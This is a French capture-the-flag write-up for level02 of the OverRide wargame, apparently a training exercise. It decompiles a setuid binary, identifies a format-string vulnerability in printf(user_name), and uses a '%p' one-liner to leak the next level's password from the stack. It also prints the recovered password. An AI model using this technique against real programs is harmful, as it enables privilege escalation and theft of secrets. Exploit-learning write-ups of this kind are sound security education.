Je commence par analyser mon environnement :

```
$ id && pwd && ls -la
uid=1002(level02) gid=1002(level02) groups=1002(level02),100(users)
/home/users/level02
total 21
dr-xr-x---+ 1 level02 level02   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level02 level02  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level02 level02 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
-rw-r--r--+ 1 level02 level02   41 Oct 19  2016 .pass
-rw-r--r--  1 level02 level02  675 Sep 10  2016 .profile
```

Je trouve un binaire `level02`, que je tente d'éxecuter :

```
$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: dab
--[ Password: bad
*****************************************
dab does not have access!
```

Je tente de décompiler le binaire avec [Dogbolt](hhttps://dogbolt.org/?id=60c28629-ef06-4d6a-aa25-bf54ea99c497#Hex-Rays=28) :

```c
int main(int argc, const char **argv)
{
  char password[100]; // [rsp+10h] [rbp-110h] BYREF
  char flag[41]; // [rsp+80h] [rbp-A0h] BYREF
  char user_name[100]; // [rsp+B0h] [rbp-70h] BYREF
  int pass_len; // [rsp+114h] [rbp-Ch]
  FILE *stream; // [rsp+118h] [rbp-8h]

  memset(user_name, 0, 100);
  memset(ptr, 0, 41);
  memset(password, 0, 100);

  stream = 0;
  pass_len = 0;

  stream = fopen("/home/users/level03/.pass", "r");

  if ( !stream )
  {
    fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
    exit(1);
  }

  pass_len = fread(flag, 1, 41, stream);

  flag[strcspn(flag, "\n")] = 0;

  if ( pass_len != 41 )
  {
    fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
    fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
    exit(1);
  }

  fclose(stream);

  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");

  printf("--[ Username: ");
  fgets(user_name, 100, stdin);
  user_name[strcspn(user_name, "\n")] = 0;

  printf("--[ Password: ");
  fgets(password, 100, stdin);
  password[strcspn(password, "\n")] = 0;

  puts("*****************************************");

  if ( strncmp(flag, password, 41) )
  {
    printf(user_name);
    puts(" does not have access!");
    exit(1);
  }

  printf("Greetings, %s!\n", user_name);
  system("/bin/sh");

  return 0;
}
```

Comme précédemment dans `Rainfall`, il est ici question d'exploiter le `printf(user_name)`. En effet, `printf` sans argument et qui lit le user input est un exploit qu'on appelle "[format string vulnerability](https://owasp.org/www-community/attacks/Format_string_attack)".

Ici, il pourrait s'agir d'utiliser cet exploit afin de lire la valeur de la variable "flag" puisqu'elle contient le password et qu'elle est dans la stack.

Je ne peux pas utiliser de `break` dans `gdb` pour investiguer où se trouve la valeur de `flag` dans la stack car `gdb` n'a pas les droits de lire le fichier `.pass` et je ne peux donc pas `run` ce binaire.

Je vais donc "bruteforcer" la lecture de la stack au travers d'un petit script python :

```
$ python -c 'print("%p " * 100)'| ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe500 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x100207025 (nil) ->[0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d]<- (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

J'ai autant d'adresse si je tente avec 200, je peux donc raisonnablement imaginer que j'ai imprimé toute la stack.

Je tente une conversion HEX -> ASCII des adresses les plus suspicieuse (que j'ai mis entre crochet) :

```
0x756e505234376848 -> Hh74RPnu
0x45414a3561733951 -> Q9sa5JAE
0x377a7143574e6758 -> XgNWCqz7
0x354a35686e475873 -> sXGnh5J5
0x48336750664b394d -> M9KfPg3H
```

Cela ressemble donc fort à un mot de passe, je le tente : 

```
$ su level03
Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

level03@OverRide:~$
```